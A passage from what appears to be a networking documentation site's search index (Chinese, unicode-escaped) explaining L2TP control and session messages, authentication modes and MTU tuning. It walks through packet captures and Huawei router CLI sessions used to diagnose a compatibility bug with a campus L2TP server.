LNS\u3002\u53d1\u8d77\u7aef\u901a\u8fc7\u53d1\u9001 StopCCN \u6d88\u606f\u62a5\u6587\u5230\u5bf9\u7aef\u6765\u901a\u77e5\u5bf9\u7aef\u62c6\u9664\u63a7\u5236\u8fde\u63a5\u3002\u5bf9\u7aef\u6536\u5230\u540e\u53d1\u9001 ZLB ACK \u6d88\u606f\u4f5c\u4e3a\u56de\u5e94\uff0c\u540c\u65f6\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\u4fdd\u6301\u63a7\u5236\u8fde\u63a5\u4ee5\u9632\u6b62 ZLB ACK \u6d88\u606f\u4e22\u5931\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#l2tp-\u4f1a\u8bdd\u5efa\u7acb\u8fc7\u7a0b","title":"L2TP \u4f1a\u8bdd\u5efa\u7acb\u8fc7\u7a0b","text":"<p>L2TP \u4f1a\u8bdd\u5efa\u7acb\u8fc7\u7a0b\u4e2d\u6d89\u53ca\u7684\u6d88\u606f\u5305\u62ec\uff1a</p> <ul> <li>ICRQ\uff08Incoming-Call-Request\uff09\uff1a\u53ea\u6709 LAC \u624d\u4f1a\u53d1\u9001\uff1b\u6bcf\u5f53\u68c0\u6d4b\u5230\u7528\u6237\u7684\u547c\u53eb\u8bf7\u6c42\uff0cLAC \u5c31\u53d1\u9001 ICRQ \u6d88\u606f\u7ed9 LNS\uff0c\u8bf7\u6c42\u5efa\u7acb\u4f1a\u8bdd\u8fde\u63a5\u3002ICRQ \u4e2d\u643a\u5e26\u4f1a\u8bdd\u53c2\u6570\u3002</li> <li>ICRP\uff08Incoming-Call-Reply\uff09\uff1a\u53ea\u6709 LNS \u624d\u4f1a\u53d1\u9001\uff1b\u6536\u5230 LAC \u7684 ICRQ\uff0cLNS \u5c31\u4f7f\u7528 ICRP \u56de\u590d\uff0c\u8868\u793a\u5141\u8bb8\u5efa\u7acb\u4f1a\u8bdd\u8fde\u63a5\u3002</li> <li>ICCN\uff08Incoming-Call-Connected\uff09\uff1a\u53ea\u6709 LAC \u624d\u4f1a\u53d1\u9001\uff1bLAC \u6536\u5230 LNS \u7684 ICRP\uff0c\u5c31\u4f7f\u7528 ICCN \u56de\u590d\uff0c\u8868\u793a LAC \u5df2\u56de\u590d\u7528\u6237\u7684\u547c\u53eb\uff0c\u901a\u77e5 LNS \u5efa\u7acb\u4f1a\u8bdd\u8fde\u63a5\u3002</li> <li>CDN\uff08Call-Disconnect-Notify\uff09\uff1a\u7528\u6765\u901a\u77e5\u5bf9\u7aef\u62c6\u9664\u4f1a\u8bdd\u8fde\u63a5\uff0c\u5e76\u544a\u77e5\u5bf9\u7aef\u62c6\u9664\u7684\u539f\u56e0\u3002</li> <li>ZLB\uff08Zero-Length Body\uff09\uff1a\u5982\u679c\u672c\u7aef\u7684\u961f\u5217\u6ca1\u6709\u8981\u53d1\u9001\u7684\u6d88\u606f\u65f6\uff0c\u53d1\u9001 ZLB \u7ed9\u5bf9\u7aef\u3002\u5728\u4f1a\u8bdd\u8fde\u63a5\u7684\u62c6\u9664\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u9001 ZLB \u8fd8\u8868\u793a\u6536\u5230 CDN\u3002ZLB \u53ea\u6709 L2TP \u5934\uff0c\u6ca1\u6709\u8d1f\u8f7d\u90e8\u5206\uff0c\u56e0\u6b64\u800c\u5f97\u540d\u3002</li> </ul> <p>\u63a7\u5236\u8fde\u63a5\u6210\u529f\u5efa\u7acb\u4e4b\u540e\uff0c\u4e00\u65e6\u68c0\u6d4b\u5230\u7528\u6237\u547c\u53eb\uff0c\u5c31\u8bf7\u6c42\u5efa\u7acb\u4f1a\u8bdd\u8fde\u63a5\u3002\u4e0e\u63a7\u5236\u8fde\u63a5\u4e0d\u540c\u7684\u662f\uff0c\u4f1a\u8bdd\u8fde\u63a5\u7684\u5efa\u7acb\u5177\u6709\u65b9\u5411\u6027\u3002L2TP \u7684\u4f1a\u8bdd\u5efa\u7acb\u7531 PPP \u89e6\u53d1\u3002</p>      \u4f1a\u8bdd\u8fde\u63a5\u5efa\u7acb\u8fc7\u7a0b      Huawei <p>\u4f1a\u8bdd\u8fde\u63a5\u62c6\u9664\u7684\u53d1\u8d77\u7aef\u53ef\u4ee5\u662f LAC \u6216 LNS\u3002\u53d1\u8d77\u7aef\u901a\u8fc7\u53d1\u9001 CDN \u6d88\u606f\u62a5\u6587\u5230\u5bf9\u7aef\u6765\u901a\u77e5\u5bf9\u7aef\u62c6\u9664\u4f1a\u8bdd\u8fde\u63a5\u3002\u5bf9\u7aef\u6536\u5230\u540e\u53d1\u9001 ZLB ACK \u6d88\u606f\u4f5c\u4e3a\u56de\u5e94\u3002</p> <p>\u7528\u6237\u9a8c\u8bc1\u4f1a\u8fdb\u884c\u4e24\u6b21\uff1a\u7b2c\u4e00\u6b21\u53d1\u751f\u5728 LAC \u4fa7\uff0c\u7b2c\u4e8c\u6b21\u53d1\u751f\u5728 LNS \u4fa7\u3002\u7528\u6237\u9a8c\u8bc1\u65b9\u5f0f\u6709\u4e09\u79cd\uff1a\u4ee3\u7406\u9a8c\u8bc1\u3001\u5f3a\u5236 CHAP \u9a8c\u8bc1\u548c LCP \u91cd\u534f\u5546\u3002</p> <ul> <li>LCP \u91cd\u534f\u5546\uff1a\u5982\u679c\u9700\u8981\u5728 LNS \u4fa7\u8fdb\u884c\u6bd4 LAC \u4fa7\u66f4\u4e25\u683c\u7684\u8ba4\u8bc1\uff0c\u6216\u8005 LNS \u4fa7\u9700\u8981\u76f4\u63a5\u4ece\u7528\u6237\u83b7\u53d6\u67d0\u4e9b\u4fe1\u606f\uff08\u5f53 LNS \u4e0e LAC \u662f\u4e0d\u540c\u5382\u5546\u7684\u8bbe\u5907\u65f6\u53ef\u80fd\u53d1\u751f\u8fd9\u79cd\u60c5\u51b5\uff09\uff0c\u5219\u53ef\u4ee5\u914d\u7f6e LNS \u4e0e\u7528\u6237\u95f4\u8fdb\u884c LCP \u91cd\u534f\u5546\u3002LCP \u91cd\u534f\u5546\u4f7f\u7528\u76f8\u5e94\u865a\u62df\u63a5\u53e3\u6a21\u677f VT \u4e0a\u914d\u7f6e\u7684\u9a8c\u8bc1\u65b9\u5f0f\u3002\u6b64\u65f6\u5c06\u5ffd\u7565 NAS \u4fa7\u7684\u4ee3\u7406\u9a8c\u8bc1\u4fe1\u606f\u3002</li> <li>\u5f3a\u5236 CHAP \u9a8c\u8bc1\uff1a\u5982\u679c\u53ea\u914d\u7f6e\u5f3a\u5236 CHAP \u9a8c\u8bc1\uff0c\u5219 LNS \u5bf9\u7528\u6237\u8fdb\u884c CHAP \u9a8c\u8bc1\uff0c\u5982\u679c\u9a8c\u8bc1\u4e0d\u8fc7\u7684\u8bdd\uff0c\u4f1a\u8bdd\u5c31\u4e0d\u80fd\u5efa\u7acb\u6210\u529f\u3002</li> <li>\u4ee3\u7406\u9a8c\u8bc1\uff1a\u5982\u679c\u65e2\u4e0d\u914d\u7f6e LCP \u91cd\u534f\u5546\uff0c\u4e5f\u4e0d\u914d\u7f6e\u5f3a\u5236 CHAP \u9a8c\u8bc1\uff0c\u5219 LNS \u5bf9\u7528\u6237\u8fdb\u884c\u7684\u662f\u4ee3\u7406\u9a8c\u8bc1\u3002\u4ee3\u7406\u9a8c\u8bc1\u5c31\u662f LAC \u4fa7\u5c06 PAP \u8ba4\u8bc1\u548c CHAP \u8ba4\u8bc1\u7684\u8ba4\u8bc1\u4fe1\u606f\u901a\u8fc7 ICCN \u62a5\u6587\u4f20\u7ed9 LNS\uff0cLNS \u4fa7\u4f1a\u5229\u7528\u8fd9\u4e9b\u8ba4\u8bc1\u4fe1\u606f\u5bf9\u7528\u6237\u8fdb\u884c\u8ba4\u8bc1\u3002</li> </ul>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#l2tp-mtu-\u8c03\u4f18","title":"L2TP MTU \u8c03\u4f18","text":"<p>Quote</p> <ul> <li>MTU Tuning for L2TP - Cisco</li> </ul> <p>\u914d\u7f6e L2TP \u65f6\u5019\u5e94\u5f53\u8003\u8651\u6700\u5927\u4f20\u8f93\u5355\u5143\uff08MTU\uff09\u3002</p> <p>\u5f53\u4ee5\u592a\u7f51\u94fe\u8def MTU \u4e3a 1500 \u65f6\uff0c\u63a8\u8350\u914d\u7f6e\u5982\u4e0b\uff1a</p> <ul> <li>L2TP \u96a7\u9053\u4e0a\u7684 IP MTU \u4e3a 1460\u3002</li> <li>TCP MSS \u4e3a 1420\u3002</li> </ul> <p>\u5728\u4e0b\u9762\u7684\u6293\u5305\u5b9e\u8df5\u4e2d\u4f1a\u770b\u5230\uff0cPPP LCP \u8d1f\u8d23\u534f\u5546 L2TP \u94fe\u8def MTU\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#l2tp-\u5b9e\u8df5","title":"L2TP \u5b9e\u8df5","text":"<p>\u672c\u8282\u6211\u4eec\u901a\u8fc7\u6293\u5305\u5b9e\u8df5\u4e86\u89e3\u4e0d\u540c\u7cfb\u7edf\u4e0b L2TP \u7684\u5de5\u4f5c\u8fc7\u7a0b\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#windows","title":"Windows","text":"<p>\u70b9\u51fb VPN Connect \u540e\uff0c\u53ef\u4ee5\u770b\u5230 Windows \u7acb\u5373\u5411 LNS \u5efa\u7acb L2TP \u96a7\u9053\u3002</p> <p></p> <p>LAC \u7684 ICCN \u63a5\u7740 LNS \u7684 ZLB \u6807\u5fd7\u7740 L2TP \u96a7\u9053\u5efa\u7acb\u6210\u529f\uff0c\u63a5\u4e0b\u6765\u8fdb\u5165 PPP Establish \u9636\u6bb5\u3002</p> <p></p> <p>PPP Establish \u9636\u6bb5\u4f7f\u7528 PPP LCP \u534f\u5546\u94fe\u8def\u914d\u7f6e\uff08MTU\u3001\u538b\u7f29\u7b49\uff09\u548c\u9a8c\u8bc1\u65b9\u5f0f\uff0c\u8ba9\u6211\u4eec\u6765\u770b\u770b\u5176\u4e2d\u7684\u4e00\u4e9b\u62a5\u6587\u5185\u5bb9\uff1a</p> \u6765\u81ea\u5ba2\u6237\u7aef\u7684 Configuration Request\u6765\u81ea\u670d\u52a1\u5668\u7684 Configuration Request <pre><code>PPP Link Control Protocol\n    Code: Configuration Request (1)\n    Identifier: 1 (0x01)\n    Length: 18\n    Options: (14 bytes), Maximum Receive Unit, Magic Number, Protocol Field Compression, Address and Control Field Compression\n        Maximum Receive Unit: 1400\n        Magic Number: 0x776b2584\n        Protocol Field Compression\n        Address and Control Field Compression\n</code></pre> <pre><code>PPP Link Control Protocol\n    Code: Configuration Ack (2)\n    Identifier: 101 (0x65)\n    Length: 15\n    Options: (11 bytes), Authentication Protocol, Magic Number\n        Authentication Protocol: Challenge Handshake Authentication Protocol (0xc223)\n        Magic Number: 0x2b80df7b\n</code></pre> <p>Establish \u6210\u529f\u540e\u8fdb\u5165 Authenticate \u9636\u6bb5\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u914d\u7f6e\u4e86 CHAP \u9a8c\u8bc1\uff0c\u6b64\u5904\u4e3a\u4e09\u6b21 CHAP \u63e1\u624b\u3002</p> <p></p> <p>Authenticate \u9636\u6bb5\u6210\u529f\u540e\uff0c\u8fdb\u5165 Network \u9636\u6bb5\u3002\u53ef\u4ee5\u770b\u5230\u5ba2\u6237\u7aef\u8bf7\u6c42 IPV6CP \u548c IPCP \u534f\u5546\uff0c\u670d\u52a1\u5668\u62d2\u7edd\u4e86 IPV6CP\uff0c\u56de\u590d\u4e86 IPCP\u3002</p> <p></p> <p>\u8ba9\u6211\u4eec\u6765\u770b\u770b\u6700\u540e\u4e00\u4e2a\u4ece\u670d\u52a1\u7aef\u53d1\u7ed9\u5ba2\u6237\u7aef\u7684 IPCP \u62a5\u6587\u5185\u5bb9\uff1a</p> <pre><code>PPP IP Control Protocol\n    Code: Configuration Ack (2)\n    Identifier: 8 (0x08)\n    Length: 22\n    Options: (18 bytes), IP Address, Primary DNS Server IP Address, Secondary DNS Server IP Address\n        IP Address\n            Type: IP Address (3)\n            Length: 6\n            IP Address: ***.***.***.***(VPN IP)\n        Primary DNS Server IP Address\n            Type: Primary DNS Server IP Address (129)\n            Length: 6\n            Primary DNS Address: ***.***.***.***\n        Secondary DNS Server IP Address\n            Type: Secondary DNS Server IP Address (131)\n            Length: 6\n            Secondary DNS Address: ***.***.***.***\n</code></pre> <p>\u901a\u8fc7 IPCP\uff0c\u670d\u52a1\u5668\u7ed9\u5ba2\u6237\u7aef\u5206\u914d\u4e86\u4e00\u4e2a VPN \u4e2d\u7684 IP \u5730\u5740\u3002</p> <p>\u63a5\u4e0b\u6765\uff0c\u5404\u79cd IP \u6d41\u91cf\u90fd\u5c01\u88c5\u5230 PPP \u4e2d\u3002\u8ba9\u6211\u4eec\u4ee5 DNS \u4e3a\u4f8b\u770b\u770b\u5c01\u88c5\uff1a</p> <pre><code>Frame 162: 114 bytes on wire (912 bits), 114 bytes captured (912 bits) on interface \\Device\\NPF_{************************************}, id 0\nEthernet II, Src: MicroStarINT_**:**:** (04:7c:16:**:**:**), Dst: HuaweiTechno_**:**:** (7c:d9:a0:**:**:**)\nInternet Protocol Version 4, Src: ***.***.***.***(Client), Dst: ***.***.***.***(LNS)\nUser Datagram Protocol, Src Port: 1701, Dst Port: 1701\nLayer 2 Tunneling Protocol, Type: Data Message\nPoint-to-Point Protocol, Protocol: Internet Protocol Version 4\nInternet Protocol Version 4, Src: ***.***.***.***(VPN IP), Dst: ***.***.***.***(DNS Server)\nUser Datagram Protocol, Src Port: 63077, Dst Port: 53\nDomain Name System (query)\n</code></pre> <p>\u6309\u4e0b Disconnect \u6309\u94ae\u540e\uff0cPPP \u548c L2TP \u8fde\u63a5\u5148\u540e\u4e2d\u65ad\uff1a</p> <p></p>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#\u534e\u4e3a-ar-\u8def\u7531\u5668ar101gw-lc-sar6121ec-w","title":"\u534e\u4e3a AR \u8def\u7531\u5668\uff08AR101GW-Lc-S\u3001AR6121EC-W\uff09","text":"<p>Bug</p> <p>\u534e\u4e3a AR \u7cfb\u5217\u8def\u7531\u5668\u7684 L2TP \u5b9e\u73b0\u4e0e\u6d59\u6c5f\u5927\u5b66\u6821\u56ed\u7f51 L2TP \u914d\u7f6e\u5b58\u5728\u517c\u5bb9\u6027\u95ee\u9898\u3002\u6211\u4eec\u5df2\u7ecf\u5411\u534e\u4e3a\u53cd\u6620\u8fc7\u8be5\u95ee\u9898\uff0c\u5e76\u5f97\u5230\u7b54\u590d\uff0c\u8fd9\u662f\u56e0\u4e3a\u4e0a\u6e38\uff08\u6821\u56ed\u7f51\uff09\u914d\u7f6e\u4e0d\u5408\u7406\uff0c\u5e94\u5f53\u7531\u4e0a\u6e38\u4fee\u6539\u914d\u7f6e\u3002</p> <p>\u7ecf\u6d4b\u8bd5\uff0cTP-Link\u3001RouterOS\u3001OpenWRT \u548c Windows \u7b49\u7cfb\u7edf/\u8bbe\u5907\u5219\u6ca1\u6709\u517c\u5bb9\u6027\u95ee\u9898\u3002</p> <p>\u672c\u6b21\u5b9e\u8df5\u4ee5\u4e0a\u9762\u8fd9\u4e2a Bug \u4e3a\u4f8b\uff0c\u8fdb\u884c\u7f51\u7edc\u8bca\u65ad\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#\u534e\u4e3a\u7684-l2tp-\u5b9e\u73b0","title":"\u534e\u4e3a\u7684 L2TP \u5b9e\u73b0","text":"<ul> <li>\u534e\u4e3a\u901a\u8fc7\u865a\u62df\u6a21\u677f\u63a5\u53e3\uff08Virtual-Template\uff09\u5b9e\u73b0 L2TP \u96a7\u9053\u3002</li> <li>\u96a7\u9053\u5efa\u7acb\u540e\uff0c\u53ef\u4ee5\u5c06\u6d41\u91cf\u8def\u7531\u5230\u865a\u62df\u6a21\u677f\u63a5\u53e3\u4e0a\uff0c\u8fd9\u6837\u6d41\u91cf\u5c31\u4f1a\u88ab\u5c01\u88c5\u5230 L2TP \u62a5\u6587\u4e2d\u3002</li> <li>\u5bfc\u81f4 Bug \u7684\u4e00\u70b9\uff1a\u81ea\u52a8\u4e3a\u4f1a\u8bdd\u5bf9\u7aef\u5efa\u7acb\u76f4\u8fde\u8def\u7531\u3002</li> </ul> <p>\u8fd9\u6837\u7684\u5b9e\u73b0\u5bfc\u81f4\u5f53\u96a7\u9053\u5bf9\u7aef\u548c\u4f1a\u8bdd\u5bf9\u7aef\u76f8\u540c\u65f6\uff0c\u6570\u636e\u5305\u65e0\u6cd5\u8def\u7531\u5230\u96a7\u9053\u5bf9\u7aef\u3002</p>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#\u73af\u5883\u4ecb\u7ecd","title":"\u73af\u5883\u4ecb\u7ecd","text":"<p>\u5b9e\u9a8c\u73af\u5883\u5185\u6709\u591a\u53f0 LNS \u670d\u52a1\u5668\uff0c\u4f7f\u7528\u8d1f\u8f7d\u5747\u8861\uff1a</p> <ul> <li><code>10.0.2.72</code></li> <li><code>10.0.2.73</code></li> <li><code>10.5.1.9</code></li> <li><code>10.5.1.7</code></li> <li><code>10.5.1.5</code></li> </ul> <p>\u5b9e\u9a8c\u4f7f\u7528 AR101GW-Lc-S\uff0cWAN \u53e3\u4e3a GigabitEthernet0/0/4\u3002</p> <p>\u5185\u7f51\u7f51\u6bb5 <code>10.0.0.0/8</code>\uff0c\u9700\u8981\u8bbe\u7f6e\u9759\u6001\u8def\u7531\uff1a</p> <pre><code>Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface\n       10.0.0.0/8   Static  1    0           D   10.78.18.254    GigabitEthernet0/0/4\n</code></pre>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#\u547d\u4ee4\u64cd\u4f5c","title":"\u547d\u4ee4\u64cd\u4f5c","text":"<ul> <li>\u9996\u5148\u6d4b\u8bd5\u7f51\u7edc\u8fde\u901a\u60c5\u51b5\uff1a</li> </ul> <pre><code>&lt;Huawei&gt;display ip routing-table \nRoute Flags: R - relay, D - download to fib\n------------------------------------------------------------------------------\nRouting Tables: Public\n         Destinations : 12       Routes : 12       \n\nDestination/Mask    Proto   Pre  Cost      Flags NextHop         Interface\n\n        0.0.0.0/0   Unr     60   0           D   10.78.18.254    GigabitEthernet0/0/4\n       10.0.0.0/8   Static  1    0           D   10.78.18.254    GigabitEthernet0/0/4\n     10.78.18.0/24  Direct  0    0           D   10.78.18.3      GigabitEthernet0/0/4\n     10.78.18.3/32  Direct  0    0           D   127.0.0.1       GigabitEthernet0/0/4\n   10.78.18.255/32  Direct  0    0           D   127.0.0.1       GigabitEthernet0/0/4\n      127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0\n      127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0\n127.255.255.255/32  Direct  0    0           D   127.0.0.1       InLoopBack0\n    192.168.1.0/24  Direct  0    0           D   192.168.1.1     Vlanif1\n    192.168.1.1/32  Direct  0    0           D   127.0.0.1       Vlanif1\n  192.168.1.255/32  Direct  0    0           D   127.0.0.1       Vlanif1\n255.255.255.255/32  Direct  0    0           D   127.0.0.1       InLoopBack0\n&lt;Huawei&gt;ping lns.zju.edu.cn\n  PING lns.zju.edu.cn (10.0.2.72): 56  data bytes, press CTRL_C to break\n    Reply from 10.0.2.72: bytes=56 Sequence=1 ttl=62 time=1 ms\n    Reply from 10.0.2.72: bytes=56 Sequence=2 ttl=62 time=1 ms\n    Reply from 10.0.2.72: bytes=56 Sequence=3 ttl=62 time=1 ms\n    Reply from 10.0.2.72: bytes=56 Sequence=4 ttl=62 time=1 ms\n    Reply from 10.0.2.72: bytes=56 Sequence=5 ttl=62 time=1 ms\n\n  --- lns.zju.edu.cn ping statistics ---\n    5 packet(s) transmitted\n    5 packet(s) received\n    0.00% packet loss\n    round-trip min/avg/max = 1/1/1 ms\n\n&lt;Huawei&gt;ping 10.5.1.9\n  PING 10.5.1.9: 56  data bytes, press CTRL_C to break\n    Reply from 10.5.1.9: bytes=56 Sequence=1 ttl=62 time=1 ms\n    Reply from 10.5.1.9: bytes=56 Sequence=2 ttl=62 time=1 ms\n    Reply from 10.5.1.9: bytes=56 Sequence=3 ttl=62 time=1 ms\n    Reply from 10.5.1.9: bytes=56 Sequence=4 ttl=62 time=1 ms\n    Reply from 10.5.1.9: bytes=56 Sequence=5 ttl=62 time=1 ms\n\n  --- 10.5.1.9 ping statistics ---\n    5 packet(s) transmitted\n    5 packet(s) received\n    0.00% packet loss\n    round-trip min/avg/max = 1/1/1 ms\n</code></pre> <ul> <li>\u5176\u6b21\u5c55\u793a\u5f53\u524d\u7684 L2TP \u914d\u7f6e\uff1a</li> </ul> <pre><code>&lt;Huawei&gt;sys\n[Huawei]interface Virtual-Template 1\n[Huawei-Virtual-Template1]display this\n[V200R010C10SPC700]\n#\ninterface Virtual-Template1\n ppp chap user ***\n ppp chap password cipher ***\n ppp pap local-user *** password cipher ***\n ppp ipcp dns admit-any\n ppp ipcp dns request\n mtu 1400\n tcp adjust-mss 1200\n ip address ppp-negotiate\n nat outbound 2997 \n#\nreturn\n[Huawei-Virtual-Template1]return\n&lt;Huawei&gt;display l2tp-group \n----------------------------------------- \n  L2TP-GROUP    GROUP-NUMBER  \n----------------------------------------- \n  2               2                                  \n-----------------------------------------\n&lt;Huawei&gt;sys\n[Huawei]l2tp-group 2\n[Huawei-l2tp2]display this \n[V200R010C10SPC700]\n#\nl2tp-group 2\n undo tunnel authentication\n start l2tp ip 10.5.1.9 fullusername ***\n#\n[Huawei-l2tp2] quit\n</code></pre> <ul> <li>\u542f\u52a8 <code>10.5.1.9</code> \u7684 L2TP \u8fde\u63a5\uff0c\u5e76\u6d4b\u8bd5\u7f51\u7edc\u8fde\u901a\u60c5\u51b5\uff1a</li> </ul> <pre><code>[Huawei]interface Virtual-Template 1\n[Huawei-Virtual-Template1]l2tp-auto-client enable\n&lt;Huawei&gt;display l2tp tunnel\n\n Total tunnel : 1\n LocalTID RemoteTID RemoteAddress    Port   Sessions RemoteName\n 8        11729     10.5.1.9         1701   1        ZJG_MX960-4\n&lt;Huawei&gt;display l2tp se\n&lt;Huawei&gt;display l2tp session \n\n Total session : 1\n LocalSID  RemoteSID  LocalTID  Interface            LclTAddr        RmtTAddr        LclSAddr        RmtSAddr\n 1         5079       8         Virtual-Template1:0  10.78.18.3      10.5.1.9        210.32.148.92   10.0.2.72       \n&lt;Huawei&gt;display ip routing\n&lt;Huawei&gt;display ip routing-table \nRoute Flags: R - relay, D - download to fib\n------------------------------------------------------------------------------\nRouting Tables: Public\n         Destinations : 14       Routes : 14       \n\nDestination/Mask    Proto   Pre  Cost      Flags NextHop         Interface\n\n        0.0.0.0/0   Static  60   0           D   210.32.148.92   Virtual-Template1\n       10.0.0.0/8   Static  1    0           D   10.78.18.254    GigabitEthernet0/0/4\n      10.0.2.72/32  Direct  0    0           D   10.0.2.72       Virtual-Template1\n     10.78.18.0/24  Direct  0    0           D   10.78.18.3      GigabitEthernet0/0/4\n     10.78.18.3/32  Direct  0    0           D   127.0.0.1       GigabitEthernet0/0/4\n   10.78.18.255/32  Direct  0    0           D   127.0.0.1       GigabitEthernet0/0/4\n      127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0\n      127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0\n127.255.255.255/32  Direct  0    0           D   127.0.0.1       InLoopBack0\n    192.168.1.0/24  Direct  0    0           D   192.168.1.1     Vlanif1\n    192.168.1.1/32  Direct  0    0           D   127.0.0.1       Vlanif1\n  192.168.1.255/32  Direct  0    0           D   127.0.0.1       Vlanif1\n  210.32.148.92/32  Direct  0    0           D   127.0.0.1       Virtual-Template1\n255.255.255.255/32  Direct  0    0           D   127.0.0.1       InLoopBack0\n\n&lt;Huawei&gt;ping baidu.com\n  PING baidu.com (110.242.68.66): 56  data bytes, press CTRL_C to break\n    Reply from 110.242.68.66: bytes=56 Sequence=1 ttl=49 time=31 ms\n    Reply from 110.242.68.66: bytes=56 Sequence=2 ttl=49 time=31 ms\n    Reply from 110.242.68.66: bytes=56 Sequence=3 ttl=49 time=31 ms\n    Reply from 110.242.68.66: bytes=56 Sequence=4 ttl=49 time=31 ms\n    Reply from 110.242.68.66: bytes=56 Sequence=5 ttl=49 time=31 ms\n\n  --- baidu.com ping statistics ---\n    5 packet(s) transmitted\n    5 packet(s) received\n    0.00% packet loss\n    round-trip min/avg/max = 31/31/31 ms\n</code></pre> <ul> <li>\u5173\u95ed L2TP \u8fde\u63a5\uff1a</li> </ul> <pre><code>&lt;Huawei&gt;sys\nEnter system view, return user view with Ctrl+Z.\n[Huawei]interface Virtual-Template 1\n[Huawei-Virtual-Template1]undo l2tp-auto-client enable\n[Huawei-Virtual-Template1]return\n&lt;Huawei&gt;display l2tp tunnel\n\n Total tunnel : 1\n LocalTID RemoteTID RemoteAddress    Port   Sessions RemoteName\n 8        11729     10.5.1.9         1701   0        ZJG_MX960-4\n&lt;Huawei&gt;reset l2tp tunnel local-id 8\n  Info: Clear the tunnel, LocID = 8.\n</code></pre> <ul> <li>\u4fee\u6539\u5e76\u542f\u52a8\u5230 <code>10.0.2.72</code> \u7684 L2TP \u8fde\u63a5\uff0c\u6d4b\u8bd5\u7f51\u7edc\u8fde\u901a\u60c5\u51b5\uff1a</li> </ul> <pre><code>&lt;Huawei&gt;sys\n[Huawei]l2tp-group 2\n[Huawei-l2tp2]display this\n[V200R010C10SPC700]\n#\nl2tp-group 2\n undo tunnel authentication\n start l2tp ip 10.5.1.9 fullusername ***\n#\nreturn\n[Huawei-l2tp2]start l2tp ip 10.0.2.72 fullusername ***\n[Huawei-l2tp2]display this\n[V200R010C10SPC700]\n#\nl2tp-group 2\n undo tunnel authentication\n start l2tp ip 10.0.2.72 fullusername ***\n#\nreturn\n[Huawei-l2tp2]quit\n[Huawei]interface Virtual-Template 1\n[Huawei-Virtual-Template1]l2tp-auto-client enable\n[Huawei-Virtual-Template1]return\n&lt;Huawei&gt;display ip routing-table \nRoute Flags: R - relay, D - download to fib\n------------------------------------------------------------------------------\nRouting Tables: Public\n         Destinations : 14       Routes : 14       \n\nDestination/Mask    Proto   Pre  Cost      Flags NextHop         Interface\n\n        0.0.0.0/0   Static  60   0           D   210.32.149.51   Virtual-Template1\n       10.0.0.0/8   Static  1    0           D   10.78.18.254    GigabitEthernet0/0/4\n      10.0.2.72/32  Direct  0    0           D   10.0.2.72       Virtual-Template1\n     10.78.18.0/24  Direct  0    0           D   10.78.18.3      GigabitEthernet0/0/4\n     10.78.18.3/32  Direct  0    0           D   127.0.0.1       GigabitEthernet0/0/4\n   10.78.18.255/32  Direct  0    0           D   127.0.0.1       GigabitEthernet0/0/4\n      127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0\n      127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0\n127.255.255.255/32  Direct  0    0           D   127.0.0.1       InLoopBack0\n    192.168.1.0/24  Direct  0    0           D   192.168.1.1     Vlanif1\n    192.168.1.1/32  Direct  0    0           D   127.0.0.1       Vlanif1\n  192.168.1.255/32  Direct  0    0           D   127.0.0.1       Vlanif1\n  210.32.149.51/32  Direct  0    0           D   127.0.0.1       Virtual-Template1\n255.255.255.255/32  Direct  0    0           D   127.0.0.1       InLoopBack0\n\n&lt;Huawei&gt;display l2tp tunnel \n\n Total tunnel : 1\n LocalTID RemoteTID RemoteAddress    Port   Sessions RemoteName\n 9        5476      10.0.2.72        1701   1        ZJG_MX960-4\n&lt;Huawei&gt;display l2tp session \n\n Total session : 1\n LocalSID  RemoteSID  LocalTID  Interface            LclTAddr        RmtTAddr        LclSAddr        RmtSAddr\n 1         12710      9         Virtual-Template1:0  10.78.18.3      10.0.2.72       210.32.149.51   10.0.2.72       \n&lt;Huawei&gt;ping baidu.com\n  PING baidu.com (110.242.68.66): 56  data bytes, press CTRL_C to break\n    Request time out\n    Request time out\n    Request time out\n    Request time out\n    Request time out\n\n  --- baidu.com ping statistics ---\n    5 packet(s) transmitted\n    0 packet(s) received\n    100.00% packet loss\n</code></pre>","tags":["stable"]},{"location":"operation/network/network-technology/l2tp/#\u6293\u5305\u5206\u6790","title":"\u6293\u5305\u5206\u6790","text":"<p>\u5bf9 WAN \u53e3\u505a\u955c\u50cf\uff0c\u4f7f\u7528 WireShark \u76d1\u63a7\u7f51\u7edc\u6d41\u91cf\uff0c\u4e0b\u9762\u662f\u534e\u4e3a\u8def\u7531\u5668\u7684\u8868\u73b0\uff1a</p> <ul> <li>LNS \u8bbe\u7f6e\u4e3a <code>10.5.1.9</code> \u65f6\uff1a\u53ef\u4ee5\u770b\u5230\u4e00\u5207\u6b63\u5e38\uff0cL2TP \u96a7\u9053\u5efa\u7acb\u540e\u6210\u529f\u8fdb\u884c PPP \u62e8\u53f7\uff0cIPCP \u914d\u7f6e\u5b8c\u6210\u540e\u5f00\u59cb\u51fa\u73b0\u4e1a\u52a1\u6d41\u91cf\uff0cPPP LCP Echo/Request \u4e5f\u6b63\u5e38\u3002</li> </ul> <p></p> <ul> <li>LNS \u8bbe\u7f6e\u4e3a <code>10.0.2.72</code> \u65f6\uff1a\u5230 IPCP \u914d\u7f6e\u6210\u529f\u8fd9\u91cc\u8fd8\u662f\u6b63\u5e38\u7684\uff0c\u4f46\u968f\u540e\u53ef\u4ee5\u770b\u5230\uff0c\u6765\u81ea LNS \u7684 PPP Echo Request \u6ca1\u6709\u5f97\u5230\u534e\u4e3a\u8def\u7531\u5668\u7684\u56de\u5e94\uff0c\u4e5f\u6ca1\u6709\u4e1a\u52a1\u6d41\u91cf\u4ece WAN 